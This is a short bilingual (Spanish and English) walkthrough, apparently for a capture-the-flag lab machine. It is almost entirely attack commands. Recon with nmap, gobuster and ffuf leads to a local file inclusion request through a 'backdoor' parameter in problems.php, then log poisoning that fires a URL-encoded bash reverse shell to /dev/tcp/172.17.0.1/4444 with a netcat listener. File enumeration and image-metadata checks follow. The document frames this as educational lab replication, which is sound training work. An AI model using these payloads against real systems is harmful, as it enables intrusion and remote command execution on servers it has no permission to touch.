### Para Comenzar (Español) 🚀

1. Reconocimiento: escanea la máquina objetivo
   - nmap -sC -sV -oN nmap.txt 172.17.0.2
2. Descubrimiento de directorios: busca endpoints web interesantes
   - gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
3. Fuzzing de parámetros: identifica parámetros vulnerables en `problems.php`
   - ffuf -u "http://172.17.0.2/problems.php?backdoor=FUZZ" -w /path/to/payloads -o ffuf.txt
4. Verifica LFI y logs: intenta leer el log de errores
   - http://172.17.0.2/problems.php?backdoor=../../../../../../../var/log/apache2/error.log&cmd=id
5. Prepara escucha y dispara la reverse shell (desde el atacante)
   - nc -lnvp 4444
   - `http://172.17.0.2/problems.php?backdoor=/../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4444%200%3E%261%27`
6. Enumeración y escalada: busca credenciales y analiza metadatos de imágenes
   - find / -type f -mtime +8760 2>/dev/null | head -10
   - transferir `toor.jpg` al atacante y ejecutar: `exiftool toor.jpg`

---

### Quick Start Guide (English) 🚀

1. Recon: scan the target host
   - nmap -sC -sV -oN nmap.txt 172.17.0.2
2. Directory discovery: find hidden endpoints
   - gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
3. Parameter fuzzing: identify vulnerable parameters in `problems.php`
   - ffuf -u "http://172.17.0.2/problems.php?backdoor=FUZZ" -w /path/to/payloads -o ffuf.txt
4. Verify LFI and logs: try to read the error log
   - http://172.17.0.2/problems.php?backdoor=../../../../../../../var/log/apache2/error.log&cmd=id
5. Start a listener and trigger the reverse shell (attacker machine)
   - nc -lnvp 4444
   - `http://172.17.0.2/problems.php?backdoor=/../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4444%200%3E%261%27`
6. Enumerate and escalate: search for credentials and analyze image metadata
   - find / -type f -mtime +8760 2>/dev/null | head -10
   - transfer `toor.jpg` to the attacker machine and run: `exiftool toor.jpg`

> Nota: estos pasos son para replicación en entornos controlados/educativos y preservan exactamente los comandos y payloads usados en el laboratorio.
